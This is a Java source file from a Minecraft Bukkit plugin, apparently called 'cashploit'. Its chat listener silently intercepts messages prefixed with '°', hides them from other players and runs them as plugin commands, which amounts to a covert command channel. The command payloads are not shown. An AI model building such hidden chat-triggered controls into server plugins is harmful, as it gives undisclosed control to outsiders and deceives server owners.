package de.cashploit5.events;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import de.cashploit5.Main;
import de.cashploit5.command.Command;

@SuppressWarnings("deprecation")
public class ChatListener implements Listener {
	
	private Main main;
	
	public ChatListener(Main main) {
		main.getServer().getPluginManager().registerEvents(this, main);
		this.main = main;
	}
	
	@EventHandler(priority=EventPriority.HIGHEST)
	public void onChat(PlayerChatEvent e) {
		
		Player p = e.getPlayer();
		String msg = e.getMessage();
		
		if(msg.startsWith("°")) {
			e.setCancelled(true);
			String[] arguments = msg.split(" ");
			for(Command command : main.getCommandManager().getCommands()) {
				if(command.getName().equalsIgnoreCase(arguments[0].substring(1))) {
					String[] args = msg.replace(arguments[0], "").split(" ");
					
					command.onCommand(p, command, args);
					
					return;
				}
			}
			Main.sendMessage(p, "§cCommand wurde nicht gefunden! (§6°help§c)");
		}
	}
}
